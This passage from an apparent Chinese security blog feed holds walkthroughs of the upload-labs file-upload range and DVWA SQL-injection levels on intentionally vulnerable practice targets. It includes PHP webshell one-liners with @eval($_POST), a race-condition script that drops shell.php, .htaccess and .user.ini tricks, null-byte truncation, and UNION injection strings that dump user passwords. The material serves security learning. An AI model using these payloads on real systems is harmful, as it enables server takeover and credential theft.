href="#pass-10%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8D%95%E6%AC%A1%E5%A4%84%E7%90%86">Pass-10（黑名单-单次处理）</a></li><li><a href="#pass-11%E9%BB%91%E5%90%8D%E5%8D%95-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87">Pass-11（黑名单-双写绕过)</a></li><li><a href="#pass-12%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-get%E5%9E%8B">Pass-12（白名单-0x00截断-GET型)</a></li><li><a href="#pass-13%E7%99%BD%E5%90%8D%E5%8D%95-0x00%E6%88%AA%E6%96%AD-post%E5%9E%8B">Pass-13（白名单-0x00截断-POST型)</a></li><li><a href="#pass-14%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-14（白名单-图片马)</a></li><li><a href="#pass-15%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-getimagesize">Pass-15(白名单-图片马-getimagesize())</a></li><li><a href="#pass-16%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-exif_imagetype">Pass-16(白名单-图片马-exif_imagetype())</a></li><li><a href="#pass-17%E7%99%BD%E5%90%8D%E5%8D%95-%E5%9B%BE%E7%89%87%E9%A9%AC-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">Pass-17(白名单-图片马-二次渲染)</a></li><li><a href="#pass-18%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E6%97%B6%E9%97%B4">Pass-18（白名单-条件竞争-时间)</a></li><li><a href="#pass-19%E7%99%BD%E5%90%8D%E5%8D%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-%E5%9B%BE%E7%89%87%E9%A9%AC">Pass-19（白名单-条件竞争-图片马)</a></li><li><a href="#pass-20%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-20（黑名单验证-点号绕过……)</a></li><li><a href="#pass-21%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87">Pass-21（白名单验证-数组绕过)</a></li><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li></ul><h2 id="文件上传漏洞介绍"><a class="header-anchor" href="#文件上传漏洞介绍">🍭</a>文件上传漏洞介绍</h2><p>web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码。攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。详情：<a href="https://segmentfault.com/a/1190000016012608">文件上传漏洞</a></p><p>共有以下几种类型：</p><p><img src="/2021/01/24/upload/2.jpg" alt="2"></p><p>（做了m久的思维导图…)</p><h1>Pass-01(前端js绕过)</h1><p>页面要求上传webshell，随意写一个php上传(一句话木马在本地端不直观)后：</p><img src="/2021/01/24/upload/1.jpg" alt="1" style="zoom:67%;"><p>查看源码发现为js前端验证，且定义了一个白名单，只让图示几种格式通过。js前端验证有以下几种思路：</p><p>1、删除js校验代码</p><p>2、更改js校验中的白名单</p><p>3、先改文件后缀名通过js校验再抓包更改后缀上传至服务器</p><h3 id="删除js校验代码"><a class="header-anchor" href="#删除js校验代码">🍭</a>删除js校验代码</h3><p>本来可以在firebug进行删改，新版火狐没有这个插件了，只能通过源代码或者抓包进行删改了。将验证函数删除即可：</p><p><img src="/2021/01/24/upload/4.jpg" alt="4"></p><h3 id="更改js校验中的白名单"><a class="header-anchor" href="#更改js校验中的白名单">🍭</a>更改js校验中的白名单</h3><p>将PHP格式加上：</p><p><img src="/2021/01/24/upload/3.jpg" alt="3"></p><h3 id="先改文件后缀名通过js校验再抓包更改后缀上传至服务器"><a class="header-anchor" href="#先改文件后缀名通过js校验再抓包更改后缀上传至服务器">🍭</a>先改文件后缀名通过js校验再抓包更改后缀上传至服务器</h3><p>先将PHP后缀改为jpg格式的图片，上传时进行抓包拦截，再修改后缀:</p><p><img src="/2021/01/24/upload/6.jpg" alt="6"></p><p>上传成功~~</p><p><img src="/2021/01/24/upload/5.jpg" alt="5"></p><h1>Pass-02(MIME验证)</h1><p>提示显示进行MIME校验：</p><p>MIME(Multipurpose Internet Mail  Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p><p>常见类型：</p><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">audio</span>/mpeg -&gt;</span> .mp3<span class="hljs-function"><span class="hljs-title">application</span>/msword -&gt;</span> .doc<span class="hljs-function"><span class="hljs-title">application</span>/octet-stream -&gt;</span> .exe<span class="hljs-function"><span class="hljs-title">application</span>/pdf -&gt;</span> .pdf<span class="hljs-function"><span class="hljs-title">application</span>/x-javascript -&gt;</span> .js<span class="hljs-function"><span class="hljs-title">application</span>/x-rar -&gt;</span> .rar<span class="hljs-function"><span class="hljs-title">application</span>/zip -&gt;</span> .zip<span class="hljs-function"><span class="hljs-title">image</span>/gif -&gt;</span> .gif<span class="hljs-function"><span class="hljs-title">image</span>/jpeg -&gt;</span> .jpg / .jpeg<span class="hljs-function"><span class="hljs-title">image</span>/png -&gt;</span> .png<span class="hljs-function"><span class="hljs-title">text</span>/plain -&gt;</span> .txt<span class="hljs-function"><span class="hljs-title">text</span>/html -&gt;</span> .html<span class="hljs-function"><span class="hljs-title">video</span>/mp4 -&gt;</span> .mp4</code></pre><p>查看源码：</p><p><img src="/2021/01/24/upload/7.jpg" alt="7"></p><p>本关类型是image/jpeg、image/png、image/gif中的任何一种就允许上传，否则就提示文件类型不正确。当上传一个PHP时，MIME类型不符合服务器端的要求，上传就会失败。pass-01中先改文件后缀名通过js校验再抓包更改后缀上传至服务器的方法一样可行。</p><p>另一种方法是改MIME类型：</p><p>上传PHP，抓包将MIME类型改为服务器允许的，原理是绕过了服务器端对MIME的检测并成功将shell上传。</p><p><img src="/2021/01/24/upload/8.jpg" alt="8"></p><h1>Pass-03(黑名单绕过)</h1><p>查看提示：</p><img src="/2021/01/24/upload/9.jpg" alt="9" style="zoom:50%;"><p>本关属于黑名单验证</p><pre><code class="hljs jboss-cli">黑名单过滤的缺点：    攻击者可以从黑名单中找到Web开发者忽略的扩展名    没有进行大小写转换，诸如<span class="hljs-string">.PHP</span>扩展名不在黑名单里，依旧会被服务器接收    windows系统下，如果文件名以<span class="hljs-string">&quot;.&quot;</span>或空格结尾会自动取出。asp.转化为asp</code></pre><p>本关将常用脚本语言的shell文件后缀全部禁止，Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置，规定哪些文件后缀是以php格式来解析的。本关的解法就从这得来，尝试用php3,phtml绕过：</p><p>一样先抓包，改后缀名，本关上传一句话木马，因为通过这种方式上传的文件服务器会修改文件名，故蚁剑连接时文件名记得换。</p><h1>Pass-04(黑名单绕过-.htaccess)</h1><p>查看提示黑名单有点多，但是漏掉了Apache服务器的一个配置文件.htaccess。所以这关的思路就是<strong>先上传一个htaccess文件，写入规则让服务器把指定的文件格式按照php的格式解析。然后就上传指定文件格式的文件（不在黑名单中的）进行测试。</strong></p><p>文件要写入：SetHandler application/x-httpd-php(让Apache对当前目录中的所有文件都以php的格式进行解析).上传，抓包:</p><p><img src="/2021/01/24/upload/10.jpg" alt="10"></p><p>再将shell改一下拓展名，上传即可。</p><h1>Pass-05（黑名单验证，.user.ini.）</h1><p><img src="/2021/01/24/upload/11.jpg" alt="11"></p><p>本关可以利用ini配置文件进行上传，先上传以<code>auto_prepend_file=1.jpg</code>为内容的<code>.user.ini</code>文件（<strong>所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini</strong>）然后再上传一句话的脚本，命名为<code>1.jpg</code>。访问即可。</p><h1>Pass-06(黑名单验证-大小写绕过)</h1><p>查看源代码可知无大小写转换，将文件名后缀直接改成Php,大小写混合的格式即可。</p><h1>Pass-07(<strong>黑名单验证–空格绕过</strong>)</h1><p>从源码中可以看到，服务器端对文件后缀名仅仅是进行了去除末尾的”.”以及小写转换操作。但是并没有进行去除空格的操作,(<strong>windows系统中会将文件扩展名后的空格做空处理，防止文件被当成另一种不可识别的文件类型。故可利用这个特性来绕过这一关的黑名单</strong>)直接上传，抓包，加空格，访问。</p><h1>Pass-08（黑名单验证–点号绕过）</h1><p>观察代码，没有进行点号去除(<strong>windows系统对于文件后缀名后面跟的”.”会自动去除，不管是添加一个还是多个效果都是一样的</strong>)，利用此点，抓包，加点。</p><h1>Pass-09(黑名单验证–特殊字符::$DATA绕过)</h1><p>代码少了对<code>::$DATA</code>的处理</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">DATA</span><span class="hljs-params">(NTFS文件系统的存储数据流的一个属性)</span><span class="hljs-title">NTFS</span></span>文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：<span class="hljs-variable">$DATA</span>,当我们访问<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span> 时，就是请求 <span class="hljs-number">1</span><span class="hljs-selector-class">.php</span> 本身的数据，如果<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span> 还包含了其他的数据流，比如<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span>:lake2.php，请求<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>:lake2<span class="hljs-selector-class">.php</span>::<span class="hljs-variable">$DATA</span>，则是请求<span class="hljs-number">1</span>.php中的流数据lake2.php的流数据内容。</code></pre><p>故本关可解：抓包，改后缀(加上::$DATA)，访问(<strong>服务器端会对文件进行重命名,且文件为正常的php文件，故一样可用蚁剑连接</strong>)</p><h1>Pass-10（黑名单-单次处理）</h1><p>从源代码看，貌似前几关的漏洞都没有了，观察代码：</p><p><img src="/2021/01/24/upload/12.jpg" alt="12"></p><p>进行了一次删除<code>.</code>的操作就直接拼接到了上传目录的后面</p><p><img src="/2021/01/24/upload/13.jpg" alt="13"></p><p>而前面几关都是做完所有的防绕过处理之后得到的文件名进行拼接的。所以我们只需构造一个<strong>经过所有的防绕过操作之后不在黑名单中，并且经过去除末尾”.”号之后拼接还能被解析的后缀</strong>，故本关可在文件后缀加上<code>. .</code>一个点应付一次去点，一个空格应付一个去空格，这样就可以了</p><h1>Pass-11（黑名单-双写绕过)</h1><p>本关的关键在str_ireplace（）函数</p><p>语法:</p><pre><code class="hljs reasonml">str<span class="hljs-constructor">_ireplace(<span class="hljs-params">find</span>,<span class="hljs-params">replace</span>,<span class="hljs-params">string</span>,<span class="hljs-params">count</span>)</span></code></pre><p>此函数用于替换字符串中的一些字符（不区分大小写），比如本关源代码中<code>str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>便是将<strong>文件名中含有黑名单字符串的那一部分替换为空</strong>，具体用法：<a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp">str_irplace函数</a></p><p>利用此特性便可构造<code>.pphphp</code>后缀，当匹配到第一个p时不满足，匹配到第二个就能匹配到php且被去除，这里在匹配完成之后就不会对剩下的继续进行匹配了，因此剩下的p和hp自然就组合为了php。完美绕过str_ireplace（）函数的过滤。</p><h1>Pass-12（白名单-0x00截断-GET型)</h1><p>提示里说上传路径可控，查看源码，判断为白名单验证，但是路径可控是什么意思?</p><p>截断原理：chr()是一个用来返回参数所对应的字符的函数，故chr（）表示空，<strong>当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生</strong>，与之相关还有一个知识点：</p><pre><code class="hljs angelscript">%<span class="hljs-number">00</span>是对ascii码中的<span class="hljs-number">0</span>对应的字符编码后的结果，<span class="hljs-number">0x00</span>则是%<span class="hljs-number">00</span>解码成的<span class="hljs-number">16</span>进制。当url中的参数是通过GET方式获取时，%<span class="hljs-number">00</span>会被自动解码。当通过POST方式获取时，不会自动解码，%<span class="hljs-number">00</span>只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它的十六进制改写为<span class="hljs-number">0x00</span>。</code></pre><p>截断还需满足</p><ul><li>php 版本&lt;5.3.4</li><li>php.ini中的magic_quotes_gpc是off状态(<strong>当magic_quotes_gpc开启时，所有的 单引号，双引号，反斜线和 NULL字符（%00）都会被自动加上一个反斜杠进行转义</strong>)</li></ul><p>上传，抓包，做如下修改：</p><p><img src="/2021/01/24/upload/14.jpg" alt="14"></p><h1>Pass-13（白名单-0x00截断-POST型)</h1><p>本关与上一关相似，上一关为GET方式本关为POST方式，前面讲了POST和GET的区别，故本关只需在上一关的基础上，将hex中空格的值由0d改成00即可</p><h1>Pass-14（白名单-图片马)</h1><p>提示说本关检查图标内容开头2个字节，查看源码，源码只检测文件头部2个字节信息，那它怎么知道文件类型？查阅资料发现，一般的文件前两个字节信息都能表明自己文件类型（用winhex察看图片的文件头）例如：</p><table><thead><tr><th>type</th><th>ExtensionsHeader</th></tr></thead><tbody><tr><td>jpeg</td><td>0xFFD8FF</td></tr><tr><td>png</td><td>0x89504E470D0A1A0A</td></tr><tr><td>gif</td><td>GIF8</td></tr><tr><td>tiff</td><td>0x49492A00 or 0x4D4D002A</td></tr><tr><td>Bit   map</td><td>BM</td></tr><tr><td>PC Paintbrush</td><td>0x0A050108</td></tr><tr><td>AOL ART</td><td>0x4A47040E000000 or 0x4A47030E000000</td></tr></tbody></table><p>本关所说的图片马就是把一张正常的图片和一个shell文件合在一起形成一个新的文件，可以把新的文件定义成图片。</p><p><img src="/2021/01/24/upload/15.jpg" alt="15"></p><p>上图为cmd方法制图片马。格式：<code>copy 1.jpg/b+1.php 2.jpg </code>（参数/b指定以二进制格式复制、合并文件(图片)，参数/a指定以ASCI1格式复制、合并文件( php文件)）.</p><p>但是一张图片不能被解析成php执行，故图片马不能直接上传。但是本关任务中第二点提到了使用<a href="http://127.0.0.1/upload-labs/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。故我们可以新建一个文件包含漏洞页面来模拟真实环境。</p><p>在上传目录中新建一个include.php文件，写入如下代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$file = $_GET[ <span class="hljs-string">&#x27;page&#x27;</span> ] ;<span class="hljs-keyword">include</span> ($file);<span class="hljs-meta">?&gt;</span></code></pre><p>再用蚁剑连接(<strong>jpg格式的文件无法直接与蚁剑连接，要借助文件包含获取已知的PHP，asp，aspx……文件来连接蚁剑</strong>)</p><p><img src="/2021/01/24/upload/16.jpg" alt="16"></p><h1>Pass-15(白名单-图片马-getimagesize())</h1><p>了解一下提示中提到的<code>getimagesize()</code>函数:</p><p>获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。语法格式：</p><pre><code class="hljs smali">array getimagesize ( string $filename [,<span class="hljs-built_in"> array </span>&amp;$imageinfo ] )</code></pre><p><code>getimagesize() </code>函数将测定任何 <code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP</code> 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。详情：<a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize()函数</a></p><p>接下来在目录里创建一个php文件来测试该函数返回数组的各个值的含义。代码:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$local_jpg =<span class="hljs-string">&#x27;./00.jpg&#x27;</span>;$img_data = getimagesize($local_jpg);<span class="hljs-comment">//getimagesize()函数对本地图片00.jpg进行检查</span>var_dump($img_data );<span class="hljs-comment">//打印检查结果的数组</span><span class="hljs-meta">?&gt;</span></code></pre><p>运行：</p><p><img src="/2021/01/24/upload/17.jpg" alt="17"></p><p>索引的含义：</p><pre><code class="hljs angelscript">索引<span class="hljs-number">0</span> &gt;&gt;图像宽度的像素值索引<span class="hljs-number">1</span> &gt;&gt;图像高度的像素值索引<span class="hljs-number">2</span> &gt;&gt;图像的类型，<span class="hljs-number">1</span> = GIF，<span class="hljs-number">2</span> = JPG，<span class="hljs-number">3</span> = PNG，<span class="hljs-number">4</span> = SWF，<span class="hljs-number">5</span> = PSD，<span class="hljs-number">6</span> = BMP，<span class="hljs-number">7</span> = TIFF(<span class="hljs-built_in">int</span>el byte order)，<span class="hljs-number">8</span> = TIFF(motorola byte order)，<span class="hljs-number">9</span> = JPC，<span class="hljs-number">10</span> = JP2，<span class="hljs-number">11</span> = JPX，<span class="hljs-number">12</span> = JB2，<span class="hljs-number">13</span> = SWC，<span class="hljs-number">14</span> = IFF，<span class="hljs-number">15</span> = WBMP，<span class="hljs-number">16</span> = XBM索引<span class="hljs-number">3</span> &gt;&gt;一个宽度和高度的字符串索引 bits &gt;&gt;图像的每种颜色的位数，二进制格式索引 channels &gt;&gt;图像的通道值<span class="hljs-comment">//本次测试没有</span>索引 mime &gt;&gt;图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息</code></pre><p>源代码:</p><p><img src="/2021/01/24/upload/18.jpg" alt="18"></p><p>并未做其它更多的过滤操作，所以上一关的图片马依然可用。</p><h1>Pass-16(白名单-图片马-exif_imagetype())</h1><p>提示中换了一个函数：exif_imagetype()</p><pre><code class="hljs isbl">读取一个图像的第一个字节并检查其签名，恰当的签名则返回一个对应的常量，否则返回 <span class="hljs-variable"><span class="hljs-literal">FALSE</span></span>。返回值跟<span class="hljs-function"><span class="hljs-title">getimagesize</span>() 返回的数组中的索引 <span class="hljs-number">2</span> 的值是一样的(<span class="hljs-variable">pass</span>-<span class="hljs-number">15</span>中讲的)</span></code></pre><p>语法格式:</p><pre><code class="hljs awk">exif_imagetype ( string <span class="hljs-variable">$filename</span><span class="hljs-regexp">//</span>文件位置和名称)</code></pre><p>一样写个测试文件进行测试</p><p><img src="/2021/01/24/upload/19.jpg" alt="19"></p><p>函数貌似未定义，查找资料发现面板里的拓张没开</p><p><img src="/2021/01/24/upload/20.jpg" alt="20"></p><p>php.ini中extension=php_exif.dll前面的分号要去掉。在测试返回值为3，只检查了签名，图片马依旧可以。</p><h1>Pass-17(白名单-图片马-二次渲染)</h1><p>提示说渲染了图片？查看源码，使用了imagecreatefrom 系列函数来获取原文件的数据并创建一个新的图像文件，再重命名。</p><p><code>imagecreatefromgif()</code>：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 <code>imagecreatefromjpeg()</code>，<code>imagecreatefrompng()</code>等同理，这样看来图片渲染好像只是换了一个名字而已.</p><p>先用GIF试，先合成一个GIF的图片马，上传，访问</p><img src="/2021/01/24/upload/21.jpg" alt="21" style="zoom: 50%;"><p>额…小场面…不慌。上传成功却不能访问??需要去对比两个gif</p><p><img src="/2021/01/24/upload/22.jpg" alt="22"></p><p><img src="/2021/01/24/upload/23.jpg" alt="23"></p><p>发现服务器上文件末尾的php代码不见了，这应该就是渲染的作用。我们的目的是让服务器中的文件依然保存我们想要执行的代码，就需要去找渲染前后没有变化的位置，然后将php代码写进去(注意要将代码转化为对应进制编译器的进制数再写入),再上传就可以啦，不截图了。</p><p>但是本关的要求是图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！png就不是这样了，要实现png二次渲染的绕过就需要深入了解png的格式。此部分再另一文章《二次渲染&amp;&amp;png结构分析》说明。</p><h1>Pass-18（白名单-条件竞争-时间)</h1><p>提示说要代码审计，查看源码，源码解释得很清楚，先将上传的文件保存，然后将文件的后缀名同白名单对比，符合就将文件进行重命名。不符，unlink()函数就会删除该文件，虽然上传会被删除，但如果我们能在上传的一句话被删除之前访问就可以了。这个方法也叫条件竞争上传绕过。可以利用burp多线程发包，然后不断在浏览器访问代码，会有一瞬间的访问成功，通过burp一直不停的重放，会有一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一句话。</p><p>上传的一句话：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-comment">//若访问到文件则在根目录里生成shell.php文件&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[&quot;test&quot;])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span></code></pre><p>先上传，抓包，设置Null payloads也就是不设置payload。设置Continue indefinitely无限重放。</p><img src="/2021/01/24/upload/24.jpg" alt="24" style="zoom:50%;"><p>根目录出现shell.php,连接蚁剑</p><img src="/2021/01/24/upload/25.jpg" alt="25" style="zoom:50%;"><p>成功~~</p><h1>Pass-19（白名单-条件竞争-图片马)</h1><p>一样是代码审计，依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与Pass-18存在同样的条件竞争。不过这里先检查了后缀，所以要上传符合白名单里的文件才可以，只能用图片马了，而且需要在图片马没有被重命名之前访问它。本关可以沿用上一关的一句话木马，再用相同手段进行不断重放，也可以借助脚本进行不断访问。但这里还有一个有趣的解法：也可将php文件后缀名更改为.php.7z，因为白名单中允许上传.7z的文件，但是apache又不能解析这个格式而会把该文件当php的格式解析。</p><h1>Pass-20（黑名单验证-点号绕过……)</h1><p>查看代码</p><p><img src="/2021/01/24/upload/26.jpg" alt="26"></p><h4 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h4><p>因为黑名单都是小写的形式，故可上传一个一句话木马然后将其命名为PHP形式后缀即可绕过</p><h4 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h4><p>在<code>save_name</code>参数中文件名称后面加空格绕过</p><h4 id="法三"><a class="header-anchor" href="#法三">🍭</a>法三</h4><p>还可以通过<code>save_name</code>参数来进行00截断，</p><p><img src="/2021/01/24/upload/27.jpg" alt="27"></p><h4 id="法四"><a class="header-anchor" href="#法四">🍭</a>法四</h4><p>利用<code>pathinfo</code>函数</p><p>格式：</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pathinfo</span><span class="hljs-params">(path,options)</span></span></code></pre><table><thead><tr><th style="text-align:center">参数</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:center">path</td><td>必需。规定要检查的路径。</td></tr><tr><td style="text-align:center">process_sections</td><td>可选。规定要返回的数组元素。默认是 all。 可能的值：                  <code>PATHINFO_DIRNAME</code> //目录- 只返回<code>dirname   </code>                                                <code>PATHINFO_BASENAME</code> //文件加后缀名- 只返回 <code>basename  </code>                                  <code>PATHINFO_EXTENSION </code>//后缀名- 只返回 <code>extension </code></td></tr></tbody></table><p>和Pass-13类似，不过本关为黑名单，在文件保存的时候，加上<code>.</code>使得<code>pathinfo()</code>获取到的<code>PATHINFO_EXTENSION</code>为空，从而绕过黑名单。</p><h1>Pass-21（白名单验证-数组绕过)</h1><p>先检查MIME类型(改<code>Content-Type</code>)，然后判断<code>save_name</code>参数是否为空，为空就把文件名称赋值给<code>$file</code>,否则将<code>save_name</code>参数的值赋给它。然后判断<code>$file</code>是否是数组.不是就用<code>explode()</code>函数通过<code>.</code>号分割成数组,取最后一个后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。</p><p><code>explode()</code> 函数把字符串打散为数组。详情：<a href="https://www.w3school.com.cn/php/func_string_explode.asp">explode()</a></p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array &amp;<span class="hljs-variable">$array</span>)</span></span><span class="hljs-comment">//将数组的内部指针指向第一个单元</span></code></pre><p>绕过<code>explode()</code>函数：传入数组，绕过白名单，由于取的是数组最后一个，所以传入数组的最后一个要为<code>jpg|png|gif</code>，然后拼接文件名，取<code>reset()</code>第一个，即索引为0，和索引<code>count()-1</code>（数组内元素个数-1）。所以索引0应为<code>.php</code>，索引3为<code>jpg</code>（索引1之后即可），这样数组元素个数为2，拼接的就是索引0和索引1即<code>.php</code>和空，结果还是<code>.php</code></p><img src="/2021/01/24/upload/29.jpg" alt="29" style="zoom:67%;"><p>成功~~</p><img src="/2021/01/24/upload/28.jpg" alt="28" style="zoom:33%;"><h1>总结</h1><p><strong>upload-labs</strong>靶场提供了许多绕过方式，但都较为简单的，实战中会遇到更复杂的绕过方式，有可能是多种验证并存，故思路不能局限，争取一关多解，其实这个靶场跟sqli-labs有相似之处，都是先逐个介绍各种验证方式，再逐步综合到一个关卡里。但解题过程把提示，源代码看得差不多了.……还过分依赖通关手册……要反思！！靶场还是很好玩的~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||SQL注入andSQL盲注</title>
    <link href="/2021/01/22/dvwa/"/>
    <url>/2021/01/22/dvwa/</url>
    
    <content type="html"><![CDATA[<h1>dvwa</h1><h2 id="SQL-Injection"><a class="header-anchor" href="#SQL-Injection">🍭</a>SQL Injection</h2><h4 id="low"><a class="header-anchor" href="#low">🍭</a>low</h4><p>先挑熟悉的sql注入下手，单引号注入,报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1</code>推测为单引号注入，查看源代码:</p><p><img src="/2021/01/22/dvwa/3.jpg" alt="3"></p><p>确定为单引号注入，源代码中用了<code>$_REQUEST获取id参数，$_REQUEST 包含了 $_GET，$_POST 和 $_COOKIE </code>的数组，没有进行过滤，开始查字段：</p><p><code>1' order by 2#</code>回显正常:</p><p><img src="/2021/01/22/dvwa/4.jpg" alt="4"></p><p><code> 1' order by 3#</code>显示<code>Unknown column '3' in 'order clause'</code>故有两个字段，接下来查回显位置<code>1' union select 1,2# </code>:</p><p><img src="/2021/01/22/dvwa/2.jpg" alt="2"></p><p>有两个显示位。</p><p>查数据库:</p><p><code>1' union select 1,database()#</code></p><p><img src="/2021/01/22/dvwa/5.jpg" alt="5"></p><p>查表:</p><p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>回显：<code>Illegal mix of collations for operation 'UNION'</code>,百度的说法是字符集及数据表字段编码字符不一致导致的，不是很懂这条语句有什么编码问题，试试改为16进制读取：</p><p><code>1' union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p><p><img src="/2021/01/22/dvwa/6.jpg" alt="6"></p><p><code>6775657374626F6F6B2C7573657273</code>hex解码后就是<code>guestbook,users</code></p><p>查列：</p><p><code>1' union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name='users' #</code></p><p><img src="/2021/01/22/dvwa/7.jpg" alt="7"></p><p>hex解码后为:<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p><p>查数据:</p><p><code>1' union select user,password from users#</code>or<code>1' union select 1,group_concat(user,0x3a,password) from users#</code>都可以</p><p><img src="/2021/01/22/dvwa/1.jpg" alt="1"></p><h4 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h4><p><img src="/2021/01/22/dvwa/8.jpg" alt="8"></p><p>一打开就这样???去百度各种查，换PHP版本，改图示路径的代码……各种方法都试了，还是这个页面，又不想删掉重搭，然后就去虚拟机搭,虚拟机还不会用，搭个靶场搭了2小时……9(主要是找不到在虚拟机上用小皮面板搭dvwa的教程)各种报错，经历各种曲折终于搭好了</p><p><img src="/2021/01/22/dvwa/9.jpg" alt="9"></p><p>本关不能输入语句，查看源码，是POST提交，且使用<code>mysqli_real_escape_string()</code>(前两个靶场碰到很多次了，不再介绍)过滤,本关是POST方法提交表单故可以抓包修改参数。步骤不再赘述，要注意<strong>单引号会被转义，遇到union语句有单引号的可利用进制转换进行绕过</strong>。</p><h4 id="high"><a class="header-anchor" href="#high">🍭</a>high</h4><p>打开是一个链接，点开跳转到一个session页面，查看源码并没有什么过滤</p><img src="/2021/01/22/dvwa/10.jpg" alt="10" style="zoom:50%;"><p>high源码中，在session输入的id也不做处理，就相当于low的sql……</p><h4 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h4><p>查看源码</p><p><img src="/2021/01/22/dvwa/11.jpg" alt="11"></p><p>防止CSRF攻击</p><pre><code class="hljs pgsql">CSRF：跨站点请求伪造。CSRF攻击者在用户登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。应对CSRF的方法：    尽量使用POST，限制<span class="hljs-keyword">GET</span>    浏览器Cookie策略    加验证码    Referer <span class="hljs-keyword">Check</span>     Anti CSRF Token</code></pre><p>本关采用最后一种，至于<code>token</code>,在暴力破解的impossible等级我详细介绍过了。PS：貌似全面一点的防御都会用到<code>token</code></p><p>Token一般用在两个地方:</p><ul><li>防止表单重复提交：服务器端第一次验证相同过后,Token值会更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</li><li>anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</li></ul><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( <span 